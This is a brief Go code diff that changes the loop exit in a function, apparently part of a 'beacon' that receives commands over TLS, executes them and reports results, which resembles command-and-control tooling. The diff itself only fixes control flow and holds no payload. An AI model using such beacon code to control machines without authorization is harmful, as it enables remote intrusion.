@@ -176,7 +176,7 @@ func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.D
 			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
 				commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
 				if commandResult.CommandResult == "2" {
-					break
+					goto Exit
 				}
 			} else {
 				return fmt.Errorf("unexpected payload type")
@@ -189,6 +189,7 @@ func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.D
 			return fmt.Errorf("unexpected response type: %v", response.Type)
 		}
 	}
+	Exit:
 	return nil
 }
 
